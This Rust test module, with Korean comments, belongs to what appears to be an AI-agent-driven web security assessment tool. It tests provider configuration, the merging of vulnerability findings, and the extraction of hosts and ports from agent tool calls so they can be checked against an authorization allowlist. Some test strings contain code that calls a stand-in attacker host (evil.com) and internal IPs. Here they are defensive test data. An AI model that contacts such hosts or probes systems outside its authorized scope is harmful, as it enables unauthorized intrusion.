        // pi 가 실제로 설치된 머신에서는 Ok(파일)가 돌아오고, 없으면 진단 에러에
        // USERPROFILE 이 표시된다(Windows 실사용 시나리오).
        match prime_cli_path("C:\\workspace\\redcell") {
            Ok(p) => assert!(p.is_file(), "발견 경로가 파일이어야 한다: {p:?}"),
            Err(diag) => assert!(diag.contains("USERPROFILE"), "진단에 USERPROFILE 포함 필요: {diag}"),
        }
        restore(&saved);
    }

    /// models.json 병합: 기존 프로바이더는 보존, custom/ollama 는 baseUrl·apiKey·models
    /// 가 기록되고, 같은 모델 재호출 시 중복이 생기지 않아야 한다(pi 커스텀 프로바이더의
    /// "No API key found / Unknown provider" 문제의 직접 회귀 테스트).
    #[test]
    fn sync_pi_models_json_merges_and_upserts() {
        let dir = std::env::temp_dir().join(format!("rc-models-{}", std::process::id()));
        std::fs::create_dir_all(&dir).unwrap();
        let path = dir.join("models.json");
        std::fs::write(
            &path,
            r#"{"providers":{"databricks":{"baseUrl":"https://db.example","api":"openai-completions","apiKey":"keep-me","models":[{"id":"db-model"}]}}}"#,
        )
        .unwrap();
        // 첫 호출: custom 신규 추가.
        sync_pi_models_json_at(&path, "custom", "http://llm.corp.lge:8080/v1", "sk-test", "my-model", "").unwrap();
        let root: Value = serde_json::from_str(&fs::read_to_string(&path).unwrap()).unwrap();
        let providers = root["providers"].as_object().unwrap();
        // 기존 프로바이더 보존.
        assert_eq!(providers["databricks"]["apiKey"], "keep-me");
        assert_eq!(providers["databricks"]["models"][0]["id"], "db-model");
        // custom 필드 기록.
        assert_eq!(providers["custom"]["baseUrl"], "http://llm.corp.lge:8080/v1");
        assert_eq!(providers["custom"]["apiKey"], "sk-test");
        assert_eq!(providers["custom"]["api"], "openai-completions");
        assert_eq!(providers["custom"]["models"][0]["id"], "my-model");
        // 보수적 OpenAI 호환 기본값 — stream_options/include_usage 를 모르는 게이트웨이의
        // "400 status code (no body)" 회귀 방식.
        assert_eq!(providers["custom"]["compat"]["supportsUsageInStreaming"], false);
        assert_eq!(providers["custom"]["compat"]["supportsStore"], false);
        assert_eq!(providers["custom"]["compat"]["supportsDeveloperRole"], false);
        // 두 번째 호출: 같은 모델 중복 없음 + 새 모델 추가.
        sync_pi_models_json_at(&path, "custom", "http://llm.corp.lge:8080/v1", "sk-test", "my-model", "").unwrap();
        sync_pi_models_json_at(&path, "custom", "http://llm.corp.lge:8080/v1", "sk-test", "second-model", "").unwrap();
        let root: Value = serde_json::from_str(&fs::read_to_string(&path).unwrap()).unwrap();
        let models = root["providers"]["custom"]["models"].as_array().unwrap();
        assert_eq!(models.len(), 2, "모델은 업서트(중복 없이 2개)여야 한다: {models:?}");
        assert_eq!(models[1]["id"], "second-model");
        // 모델 없는 새 프로바이더는 오류.
        let err = sync_pi_models_json_at(&path, "ollama", "http://localhost:11434/v1", "x", "", "").unwrap_err();
        assert!(err.contains("모델"), "모델 미지정 시 안내 오류: {err}");
        // 키 미설정이어도 placeholder 로 프로바이더가 살아남는다.
        sync_pi_models_json_at(&path, "ollama", "http://localhost:11434/v1", "", "llama3.1", "").unwrap();
        let root: Value = serde_json::from_str(&fs::read_to_string(&path).unwrap()).unwrap();
        assert_eq!(root["providers"]["ollama"]["apiKey"], "redcell-placeholder");
        assert_eq!(root["providers"]["ollama"]["models"][0]["id"], "llama3.1");
        std::fs::remove_dir_all(&dir).ok();
    }

    #[test]
    fn pi_version_comparison() {
        assert!(!pi_version_at_least("0.85.1", "1.4.0"));
        assert!(!pi_version_at_least("1.3.9", "1.4.0"));
        assert!(pi_version_at_least("1.4.0", "1.4.0"));
        assert!(pi_version_at_least("pi v1.10.2", "1.4.0"));
        assert!(pi_version_at_least("미확인", "1.4.0"), "읽지 못하면 건드리지 않는다");
    }

    /// 기본 내장 연결(lge-aigw): 설정이 비어도 카탈로그 기본 base URL(MLflow Responses)·
    /// openai-responses 방언으로 동기화되고, 모델 메타데이터가 기록되어야 한다 —
    /// 셸 명령 키(`!ug auth-token`) 없이 붙여넣은 토큰(--api-key)으로 쓰는 직접 회귀 테스트.
    ///
    /// GLM 서빙은 thinking-only 모델이라 pi 가 보내는 `reasoning.effort="none"` 을
    /// 400 으로 거부한다(게이트웨이 직통 요청에는 reasoning 필드가 없어 성공) —
    /// `reasoning:false` 로 동기화해 pi 요청에서 reasoning 필드를 빼야 한다.
    #[test]
    fn sync_pi_models_json_lge_aigw_defaults() {
        let dir = std::env::temp_dir().join(format!("rc-models-aigw-{}", std::process::id()));
        std::fs::create_dir_all(&dir).unwrap();
        let path = dir.join("models.json");
        let conn = ProviderConn {
            api_key: "dbcsi-abc123".into(),
            base_url: String::new(), // 시딩된 기본값 — 카탈로그 base URL 로 폴백
            model: LGE_AIGW_DEFAULT_MODEL.into(),
            api: "openai-responses".into(),
        };
        sync_pi_models_json_at(
            &path,
            "lge-aigw",
            &sync_base_url("lge-aigw", &conn),
            &conn.api_key,
            &conn.model,
            &sync_api("lge-aigw", &conn),
        )
        .unwrap();
        let root: Value = serde_json::from_str(&fs::read_to_string(&path).unwrap()).unwrap();
        let aigw = &root["providers"]["lge-aigw"];
        assert_eq!(
            aigw["baseUrl"],
            "https://lge-esdatapf.cloud.databricks.com/ai-gateway/mlflow/v1",
            "빈 base_url 은 카탈로그 기본값으로: {aigw}"
        );
        assert_eq!(aigw["api"], "openai-responses");
        assert!(aigw.get("authHeader").is_none(), "responses 방언은 Bearer 기본 — authHeader 불필요: {aigw}");
        assert_eq!(aigw["apiKey"], "dbcsi-abc123", "붙여넣은 토큰은 그대로 기록");
        assert_eq!(aigw["models"][0]["id"], LGE_AIGW_DEFAULT_MODEL);
        assert_eq!(aigw["models"][0]["reasoning"], false, "thinking-only GLM 에는 reasoning 필드를 보내면 안 된다: {aigw}");
        assert!(aigw["models"][0].get("thinkingLevelMap").is_none(), "stale thinkingLevelMap 잔재: {aigw}");
        assert!(aigw["models"][0]["maxTokens"].as_u64().unwrap_or(0) >= 8192, "thinking 상한 확보");
        assert!(aigw["models"][0]["contextWindow"].as_u64().unwrap_or(0) >= 8192, "컨텍스트 명시");
        std::fs::remove_dir_all(&dir).ok();
    }

    /// 구버전 앱이 기록한 lge-aigw 항목(`reasoning:true`)도 동기화 때마다 치유되어야
    /// 한다 — 항목이 이미 있으면 새로 만들지 않던 기존 동작 탓에 stale 설정이 그대로
    /// 남아 핑 400(reasoning_effort "none" 거부)이 반복되던 회귀 테스트.
    /// 사용자가 직접 쓴 maxTokens/contextWindow 는 존중한다.
    #[test]
    fn sync_pi_models_json_lge_aigw_heals_stale_reasoning() {
        let dir = std::env::temp_dir().join(format!("rc-models-aigw-heal-{}", std::process::id()));
        std::fs::create_dir_all(&dir).unwrap();
        let path = dir.join("models.json");
        std::fs::write(
            &path,
            r#"{"providers":{"lge-aigw":{"baseUrl":"https://gw.example/mlflow/v1","api":"openai-responses","apiKey":"old","compat":{},"models":[{"id":"system.ai.glm-5-3-flash","reasoning":true,"thinkingLevelMap":{"off":"none"},"contextWindow":200000,"maxTokens":32768},{"id":"other-model","reasoning":true}]}}}"#,
        )
        .unwrap();
        sync_pi_models_json_at(
            &path,
            "lge-aigw",
            "https://gw.example/mlflow/v1",
            "new-key",
            LGE_AIGW_DEFAULT_MODEL,
            "openai-responses",
        )
        .unwrap();
        let root: Value = serde_json::from_str(&fs::read_to_string(&path).unwrap()).unwrap();
        let models = root["providers"]["lge-aigw"]["models"].as_array().unwrap();
        assert_eq!(models.len(), 2, "기존 항목은 치유만 하고 중복 추가 금지: {models:?}");
        let glm = models.iter().find(|m| m["id"] == LGE_AIGW_DEFAULT_MODEL).expect("glm 항목");
        assert_eq!(glm["reasoning"], false, "stale reasoning:true 치유: {glm}");
        assert!(glm.get("thinkingLevelMap").is_none(), "stale thinkingLevelMap 제거: {glm}");
        assert_eq!(glm["maxTokens"], 32768, "사용자 지정 상한 보존: {glm}");
        assert_eq!(glm["contextWindow"], 200000, "사용자 지정 컨텍스트 보존: {glm}");
        let other = models.iter().find(|m| m["id"] == "other-model").expect("other 항목");
        assert_eq!(other["reasoning"], false, "같은 프로바이더의 전 항목 치유: {other}");
        assert!(other["maxTokens"].as_u64().unwrap_or(0) >= 8192, "빠진 상한은 채운다: {other}");
        assert!(other["contextWindow"].as_u64().unwrap_or(0) >= 8192, "빠진 컨텍스트는 채운다: {other}");
        std::fs::remove_dir_all(&dir).ok();
    }

    /// Windows CreateProcess 명령줄 상한(32767자) 회귀 — collector 지시문(수만 자)을
    /// argv 로 넘기면 os error 206 으로 스폰 자체가 실패한다. 상한 초과분은 temp 파일로
    /// 빼고 `@경로` 를 돌려준다 (pi·prime-agent 모두 첫 프롬프트로 읽음 — 실측).
    #[test]
    fn spill_prompt_threshold_and_roundtrip() {
        assert!(spill_prompt_to_file("t", "short").is_none(), "짧은 지시문은 argv 유지");
        let big = "가".repeat(20_000); // 60KB — collector 규모
        let arg = spill_prompt_to_file("w1:컬렉터/merge", &big).expect("spill");
        assert!(arg.starts_with('@'), "@파일 형식: {arg}");
        let path = arg.trim_start_matches('@');
        let name = std::path::Path::new(path).file_name().unwrap().to_string_lossy().into_owned();
        assert!(name.starts_with("redcell-prompt-") && name.ends_with(".md"), "파일명: {name}");
        assert!(!name.contains(':') && !name.contains('/'), "태그 살균: {name}");
        assert_eq!(fs::read_to_string(path).unwrap(), big, "파일 내용 보존");
        std::fs::remove_file(path).ok();
    }

    #[test]
    fn spill_prompt_boundary() {
        let at = "x".repeat(PROMPT_SPILL_BYTES);
        assert!(spill_prompt_to_file("t", &at).is_none(), "경계값은 argv 유지");
        let over = "x".repeat(PROMPT_SPILL_BYTES + 1);
        let arg = spill_prompt_to_file("t", &over).expect("1바이트 초과는 spill");
        std::fs::remove_file(arg.trim_start_matches('@')).ok();
    }

    /// 정밀 진단은 1차 + 추가 2회 = 총 3차. 1차 뒤 1차 리포트, 3차 뒤 최종 리포트.
    #[test]
    fn deep_rounds_are_three_total() {
        assert_eq!(DEEP_MAX_ROUNDS, 3, "총 라운드 수는 3이어야 한다 (1차 + 추가 2회)");
        let followups: Vec<u32> = (1..DEEP_MAX_ROUNDS).collect();
        assert_eq!(followups, vec![1, 2], "추가 확인은 2차·3차 두 번");
    }

    /// 발견 키: 무발견 보고("추가 발견 없음/이상 없음")는 키가 아니다.
    /// 키로 잡히면 매 라운드 신규로 오판돼 수렴 판정이 무력화된다.
    #[test]
    fn finding_keys_skip_no_discovery_lines() {
        let text = "## 워커 발견 (입력값 점검 주입 공격)\n\
            - [높음] SQL 주입 신호 — 오류 노출 / 근거: syntax error\n\
            - [정보] 추가 발견 없음 — 확인한 범위: /login, /search\n\
            - [정보] 이상 없음 — 확인한 범위: 헤더 전반";
        let keys = extract_finding_keys(text);
        assert_eq!(keys.len(), 1, "진짜 발견 1건만 키여야 한다: {keys:?}");
    }

    /// 발견 키: `##` 소제목은 세지 않고, 중복은 순서 유지 제거한다.
    #[test]
    fn finding_keys_dedup_and_skip_headings() {
        let text = "## 추가 발견 (구조 살펴보기)\n\
            - [중간] 보안 헤더 누락 — CSP 없음 / 근거: 헤더 원문\n\
            - [중간] 보안 헤더 누락 — CSP 없음 / 근거: 헤더 원문";
        let keys = extract_finding_keys(text);
        assert_eq!(keys.len(), 1, "중복 발견은 1키로: {keys:?}");
        assert!(extract_finding_keys("## 추가 발견 (구조)\n## 워커 발견 (입력)").is_empty());
    }

    /// 병합 입력 절단은 뒤쪽(최신 차수)을 남긴다 — 앞쪽 절단은 새 발견을 버린다.
    #[test]
    fn combine_worker_outputs_keeps_newest_round() {
        let mut accum = std::collections::HashMap::new();
        let old = "가".repeat(COMBINE_WORKER_CAP);
        accum.insert("w1".to_string(), format!("{old}\n\n--- 추가 확인 3차 ---\n- [치명] 3차 신규 발견 — /admin 노출"));
        for id in ["w2", "w3", "w4", "w5"] {
            accum.insert(id.to_string(), "- [정보] 이상 없음 — 확인한 범위: 전부".to_string());
        }
        let (combined, ok_n) = combine_worker_outputs(&accum, 3);
        assert_eq!(ok_n, 5);
        assert!(combined.contains("3차 신규 발견"), "최신 차수 발견이 살아야 한다");
        assert!(combined.contains("앞부분"), "절단했으면 머리말로 알려야 한다");
        assert!(combined.contains("[1~3차 누적]"), "차수 구간 표기: {combined:?}");
        let (early, _) = combine_worker_outputs(&accum, 1);
        assert!(early.contains("[1차]"), "1차 병합 표기: {early:?}");
    }

    /// 빈 워커는 플레이스홀더로 채우고 ok_n 에서 제외한다.
    #[test]
    fn combine_worker_outputs_placeholder_for_empty() {
        let accum = std::collections::HashMap::new();
        let (combined, ok_n) = combine_worker_outputs(&accum, 1);
        assert_eq!(ok_n, 0);
        assert_eq!(combined.matches("결과를 내지 못했습니다").count(), 5);
    }

    /// tail_chars: 짧으면 그대로, 길면 뒤쪽만 + 생략 머리말.
    #[test]
    fn tail_chars_keeps_tail() {
        assert_eq!(tail_chars("짧은 내용", 100), "짧은 내용");
        let s = format!("{}끝부분", "앞".repeat(50));
        let out = tail_chars(&s, 3);
        assert!(out.ends_with("끝부분"), "뒤쪽이 남아야 한다: {out}");
        assert!(out.contains("앞부분 50자 생략"), "생략 분량 표기: {out}");
    }

    /// 추가 확인 발췌도 뒤쪽(최신 보고)을 남긴다.
    #[test]
    fn followup_instruction_keeps_recent_prior() {
        let def = &DEEP_WORKERS[0];
        let prior = format!("{}최신보고", "옛날보고".repeat(1000));
        let inst = deep_followup_instruction(def, 3, &prior, "- [단서:w2] 키", "http://t/", "");
        assert!(inst.contains("추가 확인 3차"), "차수 표기: {}", inst.chars().take(80).collect::<String>());
        assert!(inst.contains("최신보고"), "최신 보고가 지시문에 남아야 한다");
    }

    /// 밴딧 수확 집계 — 라운드별 워커 신규 발견 수 (결정적 정렬).
    #[test]
    fn bandit_yields_shapes() {
        let w1_line = "- [중간] 보안 헤더 누락 — x / 근거: y";
        let seen: std::collections::HashSet<String> = extract_finding_keys(w1_line).into_iter().collect();
        assert_eq!(seen.len(), 1, "정규화 키 1건 전제");
        let results = vec![
            ("w1".to_string(), PumpOutcome { text: w1_line.into(), ..Default::default() }),
            ("w2".to_string(), PumpOutcome { text: "- [높음] SQL 주입 신호 — a / 근거: b\n- [중간] XSS 반사 — c / 근거: d".into(), ..Default::default() }),
        ];
        let y = bandit_yields(&results, &seen);
        assert_eq!(y, vec![("w2".to_string(), 2), ("w1".to_string(), 0)], "{y:?}");
    }

    /// 밴딧 집중 지시 — 1위 심화·0수확 전환 (전원 0이면 무음).
    #[test]
    fn bandit_focus_shapes() {
        let y = vec![("w2".to_string(), 2), ("w1".to_string(), 0)];
        let f = bandit_focus_lines(&y);
        assert!(f["w2"].contains("심화"), "{f:?}");
        assert!(f["w1"].contains("새 표면"), "{f:?}");
        assert!(bandit_focus_lines(&[("w1".to_string(), 0)]).is_empty(), "전원 0이면 무음");
    }

    /// 세션 플레이북 — P1/위험 확정 + 체인 (세션 한정, 빈 스윕이면 무음).
    #[test]
    fn session_playbook_block_shapes() {
        let mut hits = vec![
            probes::ProbeHit { id: "P-001".into(), category: "verify-xss".into(), severity: "high".into(), target: "u".into(), title: "XSS 확정".into(), detail: "".into(), evidence: "".into(), request: "".into(), status: None, fingerprint: "".into(), verdict: "".into(), fix: "".into() },
            probes::ProbeHit { id: "P-002".into(), category: "openredirect".into(), severity: "high".into(), target: "u".into(), title: "OR".into(), detail: "".into(), evidence: "".into(), request: "".into(), status: None, fingerprint: "".into(), verdict: "".into(), fix: "".into() },
        ];
        let rep = probes::ProbeReport { target: "t".into(), started_at: "".into(), duration_ms: 1, probes_run: 10, authenticated: false, verified: 1, danger: false, hits: hits.clone(), coverage: vec![], needs_validation: vec![], stack: vec![] };
        let pb = session_playbook_block(&rep);
        assert!(pb.contains("P-001") && pb.contains("XSS 확정"), "{pb}");
        assert!(pb.contains("체인"), "{pb}");
        assert!(pb.contains("세션 한정"), "{pb}");
        hits.clear();
        let empty = probes::ProbeReport { target: "t".into(), started_at: "".into(), duration_ms: 1, probes_run: 10, authenticated: false, verified: 0, danger: false, hits, coverage: vec![], needs_validation: vec![], stack: vec![] };
        assert!(session_playbook_block(&empty).is_empty(), "빈 스윕은 무음");
    }

    /// P0 증거 블록에 체인 단서 포함.
    #[test]
    fn p0_evidence_block_carries_chains() {
        let hits = vec![
            probes::ProbeHit { id: "P-001".into(), category: "openredirect".into(), severity: "high".into(), target: "u".into(), title: "OR".into(), detail: "".into(), evidence: "".into(), request: "".into(), status: None, fingerprint: "".into(), verdict: "".into(), fix: "".into() },
            probes::ProbeHit { id: "P-002".into(), category: "xss-reflect".into(), severity: "medium".into(), target: "u".into(), title: "RX".into(), detail: "".into(), evidence: "".into(), request: "".into(), status: None, fingerprint: "".into(), verdict: "".into(), fix: "".into() },
        ];
        let rep = probes::ProbeReport { target: "t".into(), started_at: "".into(), duration_ms: 1, probes_run: 10, authenticated: false, verified: 0, danger: false, hits, coverage: vec![], needs_validation: vec![], stack: vec![] };
        let b = p0_evidence_block(&rep, 6000);
        assert!(b.contains("체인 단서") && b.contains("P-001"), "{b}");
    }

    /// 교차 단서: 타 워커의 "자기가 아직 보고하지 않은" 발견만 전달한다.
    /// 과거 버그는 전역 seen 으로 걸러 단서가 항상 0건이었다.
    #[test]
    fn followup_context_passes_cross_worker_leads() {
        let w2_text = "- [높음] SQL 주입 신호 — /login 오류 노출 / 근거: syntax error".to_string();
        let results = vec![
            ("w1".to_string(), PumpOutcome { text: "- [중간] 보안 헤더 누락 — CSP 없음 / 근거: 헤더".into(), ..Default::default() }),
            ("w2".to_string(), PumpOutcome { text: w2_text.clone(), ..Default::default() }),
        ];
        let mut accum = std::collections::HashMap::new();
        accum.insert("w1".to_string(), "- [중간] 보안 헤더 누락 — CSP 없음 / 근거: 헤더".to_string());
        accum.insert("w2".to_string(), w2_text);
        let (ctx, leads) = build_followup_context(&results, &accum, &std::collections::HashMap::new());
        assert!(leads >= 2, "서로의 발견이 단서로 오가야 한다: leads={leads}");
        let w1_cross = &ctx.get("w1").unwrap().1;
        assert!(w1_cross.contains("[단서:w2]"), "w1 에게 w2 발견이 전달되어야 한다: {w1_cross}");
        assert!(!w1_cross.contains("[단서:w1]"), "자기 발견은 단서에서 제외: {w1_cross}");
        // 자기가 이미 보고한 것은 단서에서 빠진다.
        let mut accum2 = accum.clone();
        accum2.get_mut("w1").unwrap().push_str("\n- [높음] SQL 주입 신호 — /login 오류 노출 / 근거: syntax error");
        let (ctx2, _) = build_followup_context(&results, &accum2, &std::collections::HashMap::new());
        assert!(!ctx2.get("w1").unwrap().1.contains("[단서:w2]"), "이미 아는 것은 단서 제외");
    }


    /// custom + Anthropic 방식(Databricks AI Gateway): api 방언·authHeader·compat 가
    /// 기록되고 `!명령` 키가 그대로 통과해야 한다. OpenAI 방언으로 되돌리면 게이트웨이
    /// 전용 필드는 제거된다.
    #[test]
    fn sync_pi_models_json_anthropic_dialect_and_bang_key() {
        let dir = std::env::temp_dir().join(format!("rc-models-anthropic-{}", std::process::id()));
        std::fs::create_dir_all(&dir).unwrap();
        let path = dir.join("models.json");
        sync_pi_models_json_at(
            &path,
            "custom",
            "https://ws.example.cloud.databricks.com/ai-gateway/anthropic",
            "!ug auth-token --host https://ws.example --profile test",
            "system.ai.claude-sonnet-5-5",
            "anthropic-messages",
        )
        .unwrap();
        let root: Value = serde_json::from_str(&fs::read_to_string(&path).unwrap()).unwrap();
        let custom = &root["providers"]["custom"];
        assert_eq!(custom["api"], "anthropic-messages");
        assert_eq!(custom["authHeader"], true);
        assert_eq!(custom["compat"]["supportsEagerToolInputStreaming"], false);
        assert_eq!(custom["apiKey"], "!ug auth-token --host https://ws.example --profile test");
        assert_eq!(custom["models"][0]["id"], "system.ai.claude-sonnet-5-5");
        // 사용자가 compat 을 직접 쓰면 그 값을 존중한다(기본값으로 덮지 않는다).
        sync_pi_models_json_at(&path, "custom", "https://ws.example/ai-gateway/anthropic", "!ug auth-token", "m", "anthropic-messages").unwrap();
        let root: Value = serde_json::from_str(&fs::read_to_string(&path).unwrap()).unwrap();
        assert_eq!(root["providers"]["custom"]["compat"]["supportsEagerToolInputStreaming"], false);
        // OpenAI 방언으로 전환 — 게이트웨이 전용 필드 제거 + 보수적 기본값, 키·모델·사용자
        // compat 값은 유지.
        sync_pi_models_json_at(&path, "custom", "http://llm.local/v1", "sk-x", "local-model", "openai-completions").unwrap();
        let root: Value = serde_json::from_str(&fs::read_to_string(&path).unwrap()).unwrap();
        let custom = &root["providers"]["custom"];
        assert_eq!(custom["api"], "openai-completions");
        assert!(custom.get("authHeader").is_none(), "authHeader 잔재: {custom}");
        assert!(
            custom["compat"]["supportsEagerToolInputStreaming"].is_null(),
            "anthropic 전용 compat 잔재: {custom}"
        );
        assert_eq!(custom["compat"]["supportsUsageInStreaming"], false, "보수적 기본값");
        assert_eq!(custom["apiKey"], "sk-x");
        std::fs::remove_dir_all(&dir).ok();
    }

    /// Windows npm 전역 설치(%APPDATA%\npm\node_modules\...)를 실제 파일로 만들고
    /// prime_cli_path 가 정말 찾는지 end-to-end 확인.
    #[test]
    fn prime_cli_path_finds_windows_global_npm_install() {
        let _g = ENV_LOCK.lock().unwrap();
        let saved = [
            ("HOME", std::env::var_os("HOME")),
            ("USERPROFILE", std::env::var_os("USERPROFILE")),
            ("APPDATA", std::env::var_os("APPDATA")),
            ("REDCELL_PI_DIR", std::env::var_os("REDCELL_PI_DIR")),
            ("PI_PACKAGE_DIR", std::env::var_os("PI_PACKAGE_DIR")),
        ];
        std::env::remove_var("HOME");
        let fake = std::env::temp_dir().join(format!("redcell-pi-{}", std::process::id()));
        let cli = fake
            .join("npm")
            .join("node_modules")
            .join("@earendil-works")
            .join("pi-coding-agent")
            .join("dist")
            .join("cli.js");
        std::fs::create_dir_all(cli.parent().unwrap()).unwrap();
        std::fs::write(&cli, "// fake pi cli for test
").unwrap();
        std::env::set_var("APPDATA", &fake);
        std::env::remove_var("USERPROFILE");
        std::env::set_var("LOCALAPPDATA", fake.join("Local"));
        let found = prime_cli_path("C:\\workspace\\redcell");
        assert!(found.is_ok(), "Windows npm 전역 레이아웃을 찾아야 한다: {found:?}");
        assert_eq!(
            found.unwrap().to_string_lossy(),
            cli.to_string_lossy(),
            "정확히 %APPDATA%\\npm\\...\\dist\\cli.js 여야 한다"
        );
        std::fs::remove_dir_all(&fake).ok();
        for (k, v) in saved {
            match v {
                Some(v) => std::env::set_var(k, v),
                None => std::env::remove_var(k),
            }
        }
    }

    /// pi 1.3.0 정식 진입점 우선: dist/bundle/cli.js 와 dist/cli.js 가 둘 다 있으면
    /// bundle 을 선택하고, bundle 만 없을 때 구 경로로 폴백한다.
    #[test]
    fn prime_cli_path_prefers_bundle_entry() {
        let _g = ENV_LOCK.lock().unwrap();
        let saved = [
            ("REDCELL_PI_DIR", std::env::var_os("REDCELL_PI_DIR")),
            ("PI_PACKAGE_DIR", std::env::var_os("PI_PACKAGE_DIR")),
        ];
        let fake = std::env::temp_dir().join(format!("redcell-bundle-{}", std::process::id()));
        let bundle = fake.join("dist").join("bundle").join("cli.js");
        let legacy = fake.join("dist").join("cli.js");
        std::fs::create_dir_all(bundle.parent().unwrap()).unwrap();
        std::fs::write(&bundle, "// bundle cli").unwrap();
        std::fs::write(&legacy, "// legacy cli").unwrap();
        std::env::set_var("REDCELL_PI_DIR", &fake);
        std::env::remove_var("PI_PACKAGE_DIR");
        let found = prime_cli_path("C:\\workspace\\redcell").expect("REDCELL_PI_DIR 설치를 찾아야 한다");
        assert_eq!(found, bundle, "bundle 진입점이 우선이어야 한다: {found:?}");
        // bundle 삭제 → 구 경로 폴백.
        std::fs::remove_file(&bundle).unwrap();
        let found2 = prime_cli_path("C:\\workspace\\redcell").expect("구 경로로 폴백해야 한다");
        assert_eq!(found2, legacy, "bundle 이 없으면 dist/cli.js 로 폴백: {found2:?}");
        std::fs::remove_dir_all(&fake).ok();
        for (k, v) in saved {
            match v {
                Some(v) => std::env::set_var(k, v),
                None => std::env::remove_var(k),
            }
        }
    }

    /// tool_execution_end 요약: content 첫 텍스트를 한 줄로, 없으면 details.
    #[test]
    fn tool_result_summary_shapes() {
        let ev = serde_json::json!({
            "result": { "content": [{ "type": "text", "text": "200 OK\nnginx/1.24" }], "details": {} }
        });
        assert_eq!(tool_result_summary(&ev), " — 200 OK nginx/1.24");
        let ev2 = serde_json::json!({ "result": { "content": [], "details": { "code": 404 } } });
        assert!(tool_result_summary(&ev2).contains("404"), "details 폴백: {}", tool_result_summary(&ev2));
        let ev3 = serde_json::json!({});
        assert_eq!(tool_result_summary(&ev3), "");
    }

    #[test]
    fn tool_end_status_pi_and_prime_shapes() {
        // pi 형상: 최상위 isError/durationMs.
        let pi = serde_json::json!({"isError": true, "durationMs": 42, "result": {}});
        assert_eq!(tool_end_status(&pi), (true, " 42ms".into()));
        // prime-agent 0.10.0 --mode json 실측 tool_execution_end (AttributeError 건):
        // 최상위 isError/durationMs 없음, result.details.status/durationMs 로 판정.
        let prime_err = serde_json::json!({
            "type": "tool_execution_end", "toolCallId": "call_4", "toolName": "python_repl",
            "result": {"content": [{"type": "text", "text": "Traceback (most recent call last):\nAttributeError"}],
                       "details": {"status": "error", "kernelRestarted": false, "durationMs": 16,
                                   "bashCommands": {"first": "echo INNER-OK", "count": 1, "lines": 1}}}
        });
        assert_eq!(tool_end_status(&prime_err), (true, " 16ms".into()));
        let prime_ok = serde_json::json!({
            "type": "tool_execution_end", "toolName": "python_repl",
            "result": {"content": [{"type": "text", "text": "INNER-OK\n"}],
                       "details": {"status": "ok", "kernelRestarted": false, "durationMs": 15, "stdout": "INNER-OK\n"}}
        });
        assert_eq!(tool_end_status(&prime_ok), (false, " 15ms".into()));
    }

    /// 심층 워커 정의: 5개 분야, id/label/title/brief 완비, 지시문 자족성.
    #[test]
    fn deep_workers_five_vectors() {
        assert_eq!(DEEP_WORKERS.len(), 5, "워커는 5개 분야여야 한다");
        for def in DEEP_WORKERS {
            assert!(!def.id.is_empty() && !def.label.is_empty() && !def.title.is_empty() && !def.brief.is_empty());
            let inst = deep_worker_instruction(def, "http://t/", "쇼핑몰", "", "", "");
            assert!(inst.contains(def.title), "지시문에 분야 명시: {}", def.id);
            assert!(inst.contains("web_fetch"), "웹 조회 수단 명시: {}", def.id);
            assert!(inst.contains("## 워커 발견"), "출력 형식 명시: {}", def.id);
        }
        let merge = deep_merge_instruction("http://t/", "", "--- W1 ---\n- [높음] x", "", "최종 리포트");
        assert!(merge.contains("병합"), "병합자 역할 명시");
        assert!(merge.contains("# <서비스명> 최종 리포트"), "종별 제목: {merge}");
        assert!(merge.contains("### 루트 1"), "리포트 형식 포함");
        assert!(merge.contains("멘토 노트"), "멘토 노트 라벨 포함");
    }

    /// 호스트 추출 — URL 스킴·IPv4·host 계열 필드를 args JSON 에서 수집 (중복 제거).
    #[test]
    fn extract_hosts_shapes() {
        let v = serde_json::json!({"url": "https://demo.vulnlab.local:8443/a?x=1"});
        assert_eq!(extract_hosts("web_fetch", &v), vec!["demo.vulnlab.local"]);
        let v = serde_json::json!({"code": "u1=urllib.request.urlopen(\"http://10.0.0.9/x\"); u2=requests.get('https://evil.com/')"});
        let mut h = extract_hosts("python_repl", &v);
        h.sort();
        assert_eq!(h, vec!["10.0.0.9", "evil.com"]);
        let v = serde_json::json!({"host": "10.1.2.3", "port": 8080});
        assert_eq!(extract_hosts("recon_http", &v), vec!["10.1.2.3"]);
        let v = serde_json::json!({"hostname": "Sub.Example.COM"});
        assert_eq!(extract_hosts("x", &v), vec!["sub.example.com"]);
        let v = serde_json::json!({"code": "print(40 + 2)"});
        assert!(extract_hosts("python_repl", &v).is_empty());
        let v = serde_json::json!({"url": "http://a.local/1", "target": "http://a.local/2"});
        assert_eq!(extract_hosts("x", &v), vec!["a.local"]); // 중복 제거
    }

    /// 대상 추출 — (호스트, 포트) 쌍. 명시 포트·스킴 기본값·port 키·IPv6 브라켓.
    #[test]
    fn extract_targets_shapes() {
        let v = serde_json::json!({"url": "https://demo.vulnlab.local:8443/a?x=1"});
        assert_eq!(extract_targets(&v), vec![("demo.vulnlab.local".to_string(), Some(8443))]);
        // 스킴 기본 포트 추론.
        let v = serde_json::json!({"code": "a=requests.get('https://h1.local/'); b=urllib.request.urlopen(\"http://h2.local/x\")"});
        let mut t = extract_targets(&v);
        t.sort();
        assert_eq!(t, vec![("h1.local".to_string(), Some(443)), ("h2.local".to_string(), Some(80))]);
        // port 키 동행.
        let v = serde_json::json!({"host": "10.1.2.3", "port": 8080});
        assert_eq!(extract_targets(&v), vec![("10.1.2.3".to_string(), Some(8080))]);
        // IPv6 브라켓 + 명시 포트 (네이키드 split(':') 회귀 방지).
        let v = serde_json::json!({"url": "http://[::1]:8080/x"});
        assert_eq!(extract_targets(&v), vec![("::1".to_string(), Some(8080))]);
        // 베어 IPv4 + 콜론 포트.
        let v = serde_json::json!({"code": "curl http://10.0.0.9:9000/metrics"});
        assert_eq!(extract_targets(&v), vec![("10.0.0.9".to_string(), Some(9000))]);
        // 포트 맥락 없음 → None (호스트 게이트만).
        let v = serde_json::json!({"hostname": "Sub.Example.COM"});
        assert_eq!(extract_targets(&v), vec![("sub.example.com".to_string(), None)]);
        // 브라켓 없는 IPv6 URL 도 통째로 호스트 (스킴 기본 포트).
        let v = serde_json::json!({"code": "x = \"http://::1/status\""});
        assert_eq!(extract_targets(&v), vec![("::1".to_string(), Some(80))]);
    }

    /// 반응형 게이트 포트 집행 — 인가 호스트라도 ports 지시자 밖 포트는 위반.
    #[test]
    fn decide_tool_violation_ports() {
        let auth = auth::AuthList {
            allows: vec!["demo.vulnlab.local".into(), "10.0.0.0/24".into()],
            ports: Some(vec![80, 443]),
            ..Default::default()
        };
